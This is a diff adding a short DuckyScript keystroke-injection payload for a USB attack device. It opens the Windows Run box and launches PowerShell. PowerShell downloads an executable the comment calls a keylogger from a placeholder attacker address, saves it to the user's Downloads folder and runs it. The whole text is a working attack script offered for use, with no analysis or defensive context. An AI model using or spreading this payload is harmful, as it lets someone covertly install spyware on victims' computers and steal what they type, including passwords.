@@ -1,0 +1,6 @@
+REM Below code will download and run a keylogger executable
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Command "$fileURL = 'http://<INSERT IP ADDR>/lgr.exe'; $downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'lgr.exe'); Invoke-WebRequest -Uri $fileURL -OutFile $downloadPath; & $downloadPath"
+ENTER
